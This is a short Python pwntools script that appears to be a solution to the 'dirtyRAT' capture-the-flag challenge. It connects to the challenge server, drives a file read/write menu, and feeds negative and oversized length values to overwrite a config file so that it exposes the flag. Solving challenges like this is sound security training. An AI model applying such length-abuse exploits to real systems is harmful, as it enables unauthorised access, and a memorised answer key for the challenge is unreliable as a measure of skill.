#!/usr/bin/python3

from pwn import *

#r = process("./dirtyRAT")
r = remote("dirtyrat.challs.m0lecon.it", 10010)

def sl(a, b):
    r.sendlineafter(a, b)

def ls():
    sl("Your choice: ", "1")

def read(filename, size):
    sl("Your choice: ", "2")
    sl("Insert filename: ", filename)
    sl("How many bytes to read? (Max 127 eheheeheh): ", str(size))


def write(filename, data, padd_size):
    sl("Your choice: ", "3")
    sl("Insert filename: ", filename)
    sl("Write data (ASCII, non space and max 256, upgrade plan for more features): ", data)
    sl("How many padding bytes? ", str(padd_size))


data = """
##DIRTY CONFIG HEADER
flag
cards
priv
secr
pasw
"""

data = "flag\x00"

#write("conf", "M\x00", 0)
write("conf", "\x00", 65536)
read("conf", -1)
read("conf", 0x21)
write("conf", data, 0)



r.interactive()
